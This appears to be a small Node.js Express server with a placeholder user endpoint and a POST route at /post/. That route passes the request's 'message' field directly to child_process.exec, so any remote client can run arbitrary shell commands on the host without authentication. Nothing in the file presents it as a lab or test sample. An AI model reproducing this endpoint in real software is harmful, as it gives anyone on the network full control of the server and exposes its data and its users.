const exec = require ('child_process').exec;
const express = require('express');
const app = express();
app.get('/', (req, res) => {
  const id = req.params.id;
  // Get the user data from database
  const user = {
    id: 1,
    name: 'John Doe',
  };
  // Send the response to the client
  res.send({
    user: user,
  });
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post('/post/', (req, res) => {
const message = req.body.message;
exec(message, (e, stdout, stderr) => {
        if (e instanceof Error) {
        console.error(e);
        throw e;
}
console.log(stdout);
});
res.send({
        "200":"tudo certo!"
});
});



app.listen(3000);
